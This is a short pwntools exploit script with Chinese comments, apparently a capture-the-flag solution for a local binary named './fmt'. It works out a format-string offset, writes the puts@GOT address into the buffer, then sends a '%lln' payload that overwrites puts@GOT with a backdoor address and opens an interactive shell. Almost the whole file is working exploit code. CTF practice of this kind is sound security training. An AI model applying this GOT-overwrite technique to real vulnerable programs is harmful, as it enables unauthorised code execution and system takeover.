from pwn import *

r = process(r'./fmt')
elf = ELF(r'./fmt')
context.log_level = 'debug'
context.arch = 'amd64'

# 这里的buf分两段read了，第一段是只能read 0x8个字节；第二段是进入magic函数的read
# 所以利用%p泄漏的地址的时候不要忘记第一段read

# r.sendafter(b'name: ', b'A' * 8)
# r.sendlineafter(b'beleve you', b'%12$p')
# r.recvline()
# print(r.recvline())  # 0x4141414141414141\nGoodbye!
# 经过调试在第12个位置输出了 0x4141414141414141，即A*8的值，说明buf的地址在第12个偏移的位置
offset = 12

# 也可以用 gdb的fmtarg命令来自动计算偏移:
# 在printf的位置下断点，然后: fmtarg [第一次read函数中rdi存储的内存地址]

puts_got = elf.got['puts']
backdoor_addr = 0x4011D6

# 写入put@got内存地址到buf的第一段
r.sendafter(b'name: ', p64(puts_got))

# 64位的fmt下，使用fmtstr_payload()会出现截断问题导致失败
# payload = fmtstr_payload(12, {puts_got: backdoor_addr})

print(f"puts_got: {hex(puts_got)}\nshell_addr: {hex(backdoor_addr)}")
# puts_got: 0x00404018
# shell_addr: 0x004011D6

# buf的第二段，利用fmt修改puts@got表为syetem@plt, 这里用 %lln 来一次性写入八字节
payload = f'%{backdoor_addr}c%{offset}$lln'
payload = payload.encode('utf-8')
r.sendlineafter(b'beleve you', payload)
r.interactive()
